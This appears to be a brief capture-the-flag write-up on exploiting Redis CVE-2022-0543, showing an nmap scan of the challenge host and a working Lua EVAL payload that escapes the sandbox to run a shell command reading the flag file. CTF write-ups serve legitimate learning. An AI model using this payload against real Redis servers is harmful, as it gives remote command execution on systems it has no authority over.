---
date: 2025-01-22
description: Redis RCE CVE-2022-0543
platform: Knight CTF 2025
categories: Web, Network
tags:
  - redis
  - RCE
duration:
---

# Vulnerability
```bash
nmap -sV 172.105.121.246 -p 6379
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-21 15:32 PST
Nmap scan report for 172-105-121-246.ip.linodeusercontent.com (172.105.121.246)
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
References 
- https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543
- https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
- https://www.hackthebox.com/blog/red-island-ca-ctf-2022-web-writeup

```sh
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /flag.txt", "r"); local res = f:read("*a"); f:close(); return res' 0
```